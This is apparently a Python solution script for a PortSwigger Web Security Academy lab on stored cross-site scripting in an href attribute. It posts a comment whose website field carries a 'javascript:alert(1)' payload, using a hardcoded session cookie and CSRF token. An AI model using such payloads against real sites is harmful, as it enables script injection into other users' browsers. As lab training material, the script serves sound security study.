# https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded
import requests

requests.packages.urllib3.disable_warnings()

verify = False
scheme = "https://"
proxy = "127.0.0.1:8080"
proxies = {scheme: proxy}
host = "ac5c1f1c1e0cbf8680430642008a00d8.web-security-academy.net"
path = "/post/comment"
url = scheme + host + path
cookies = {"session": "UsfZJXYyjgenWMsPs447GQWN9RLVRUf7"}
payload = "javascript:alert(1)"
data = {
    "csrf": "rCEiHNbzkaXQJfGq9sDWqZJWE1F42OHP",
    "postId": "5",
    "comment": "helloWorld",
    "name": "test",
    "email": "test@email.com",
    "website": payload,
}

requests.post(url, verify=verify, proxies=proxies, cookies=cookies, data=data)

# This is what the response looks like from a successful exploit. However, the website did not register this successful
# even though i was able to generate the alert client side. Note that this requires a manual step of clicking the name of
# the author on the comment.
# <a id="author" href="javascript:alert(1)">test</a>
